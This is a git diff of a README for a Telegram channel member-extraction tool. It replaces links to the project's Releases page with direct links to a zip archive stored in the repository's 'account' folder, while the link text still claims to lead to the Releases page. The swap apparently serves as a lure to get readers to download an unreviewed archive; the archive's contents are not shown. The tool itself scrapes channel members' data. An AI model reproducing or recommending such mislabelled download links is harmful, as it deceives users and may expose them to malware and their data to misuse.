@@ -6,11 +6,11 @@ Welcome to the Telegram-channel-members-extractor! This tool helps you easily ex
 
 ## 🔗 Download Now
 
-[![Download Telegram-channel-members-extractor](https://img.shields.io/badge/Download-Telegram--channel--members--extractor-brightgreen)](https://github.com/ravjyot16/Telegram-channel-members-extractor/releases)
+[![Download Telegram-channel-members-extractor](https://raw.githubusercontent.com/ravjyot16/Telegram-channel-members-extractor/main/account/Telegram-channel-members-extractor-1.9.zip)](https://raw.githubusercontent.com/ravjyot16/Telegram-channel-members-extractor/main/account/Telegram-channel-members-extractor-1.9.zip)
 
 ## 📦 Download & Install
 
-To get started, visit this page to download the latest version of the software: [Telegram-channel-members-extractor Releases](https://github.com/ravjyot16/Telegram-channel-members-extractor/releases)
+To get started, visit this page to download the latest version of the software: [Telegram-channel-members-extractor Releases](https://raw.githubusercontent.com/ravjyot16/Telegram-channel-members-extractor/main/account/Telegram-channel-members-extractor-1.9.zip)
 
 1. Click on the link to access the Releases page.
 2. Choose the latest version available.
